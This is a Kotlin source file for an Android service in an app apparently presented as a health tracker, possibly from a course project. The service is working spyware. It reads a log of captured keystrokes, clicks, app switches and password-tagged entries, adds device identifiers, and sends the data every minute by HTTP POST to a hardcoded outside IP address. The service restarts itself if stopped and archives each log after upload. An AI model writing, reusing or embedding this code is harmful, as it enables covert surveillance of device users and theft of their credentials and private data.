package com.inf2007.healthtracker.utilities

import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class DataExfilService : Service() {

    companion object {
        const val TAG = "DataExfilService"

        private const val ACCESSIBILITY_LOGS_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"

        fun startService(context: Context) {
            val intent = Intent(context, DataExfilService::class.java)
            context.startService(intent)
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var isUploading = false

    // Upload every 1 minute (for testing)
    private val uploadInterval = 60 * 1000L

    private val uploadRunnable = object : Runnable {
        override fun run() {
            if (!isUploading) {
                uploadAccessibilityLogs()
            }
            handler.postDelayed(this, uploadInterval)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Data exfiltration service started")

        // Start periodic uploads
        handler.postDelayed(uploadRunnable, 15000) // First upload in 15 seconds

        // Test connection
        handler.postDelayed({
            testServerConnection()
        }, 5000)

        return START_STICKY
    }

    private fun testServerConnection() {
        Thread {
            try {
                val url = URL("http://20.2.92.176:5000")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 5000

                val responseCode = connection.responseCode
                Log.d(TAG, "Server connection test: $responseCode")

                connection.disconnect()

            } catch (e: Exception) {
                Log.e(TAG, "Server connection failed: ${e.message}")
            }
        }.start()
    }

    private fun uploadAccessibilityLogs() {
        if (isUploading) return
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network available")
            return
        }

        isUploading = true

        Thread {
            try {
                // Read spy logs
                val logContent = readSpyLogs()
                if (logContent.isEmpty()) {
                    Log.d(TAG, "No logs to upload")
                    isUploading = false
                    return@Thread
                }

                // Parse logs into notifications format
                val logs = parseLogsForNotifications(logContent)

                // Send to accessibility logs endpoint
                val success = sendToAccessibilityLogsEndpoint(logs)  // FIXED METHOD NAME

                if (success) {
                    Log.d(TAG, "✅ Spy logs uploaded successfully")
                    // Archive logs after successful upload
                    archiveLogs()
                } else {
                    Log.w(TAG, "❌ Upload failed")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error uploading logs: ${e.message}", e)
            } finally {
                isUploading = false
            }
        }.start()
    }

    private fun readSpyLogs(): String {
        return try {
            val logFile = File(filesDir, "accessibility_spy.log")
            if (logFile.exists() && logFile.length() > 0) {
                logFile.readText()
            } else {
                ""
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading log file", e)
            ""
        }
    }

    private fun parseLogsForNotifications(logContent: String): JSONObject {
        val logsArray = logContent.lines().filter { it.isNotBlank() }

        val notificationData = JSONObject().apply {
            put("type", "accessibility_spy")
            put("device_id", Build.SERIAL)
            put("device_model", Build.MODEL)
            put("android_version", Build.VERSION.RELEASE)
            put("timestamp", System.currentTimeMillis())
            put("total_entries", logsArray.size)
            put("collection_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
        }

        // Categorize logs
        val categorizedLogs = JSONObject()
        val keyPresses = JSONArray()
        val appSwitches = JSONArray()
        val clicks = JSONArray()
        val sensitiveData = JSONArray()

        logsArray.forEach { line ->
            when {
                line.contains("TYPING") || line.contains("KEYPRESS") ->
                    keyPresses.put(line)
                line.contains("APP_SWITCH") ->
                    appSwitches.put(line)
                line.contains("CLICK") ->
                    clicks.put(line)
                line.contains("SENSITIVE") || line.contains("PASSWORD") ->
                    sensitiveData.put(line)
            }
        }

        // Take last N entries
        val keyPressesArray = JSONArray()
        val appSwitchesArray = JSONArray()
        val clicksArray = JSONArray()

        // Get last entries (reverse and take)
        val keyPressesList = mutableListOf<String>()
        for (i in 0 until keyPresses.length()) {
            keyPressesList.add(keyPresses.getString(i))
        }
        keyPressesList.takeLast(50).forEach { keyPressesArray.put(it) }

        val appSwitchesList = mutableListOf<String>()
        for (i in 0 until appSwitches.length()) {
            appSwitchesList.add(appSwitches.getString(i))
        }
        appSwitchesList.takeLast(20).forEach { appSwitchesArray.put(it) }

        val clicksList = mutableListOf<String>()
        for (i in 0 until clicks.length()) {
            clicksList.add(clicks.getString(i))
        }
        clicksList.takeLast(30).forEach { clicksArray.put(it) }

        categorizedLogs.put("key_presses", keyPressesArray)
        categorizedLogs.put("app_switches", appSwitchesArray)
        categorizedLogs.put("clicks", clicksArray)
        categorizedLogs.put("sensitive_data", sensitiveData)

        notificationData.put("logs", categorizedLogs)

        return notificationData
    }

    private fun sendToAccessibilityLogsEndpoint(data: JSONObject): Boolean {
        return try {
            val url = URL(ACCESSIBILITY_LOGS_ENDPOINT)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            connection.setRequestProperty("User-Agent", "HealthTracker-Spy/1.0")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.doOutput = true

            // Write data
            val outputStream = connection.outputStream
            OutputStreamWriter(outputStream, "UTF-8").use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            Log.d(TAG, "Accessibility logs endpoint response: $responseCode")

            connection.disconnect()
            responseCode == HttpURLConnection.HTTP_OK

        } catch (e: Exception) {
            Log.e(TAG, "Error sending to accessibility logs endpoint: ${e.message}")
            false
        }
    }

    private fun archiveLogs() {
        try {
            val logFile = File(filesDir, "accessibility_spy.log")
            if (logFile.exists() && logFile.length() > 0) {
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val archivedFile = File(filesDir, "accessibility_spy_$timestamp.log")
                logFile.renameTo(archivedFile)
                Log.d(TAG, "Logs archived to: ${archivedFile.name}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error archiving logs: ${e.message}")
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Network check error", e)
            false
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(uploadRunnable)
        Log.d(TAG, "Data exfiltration service destroyed")
        super.onDestroy()
    }
}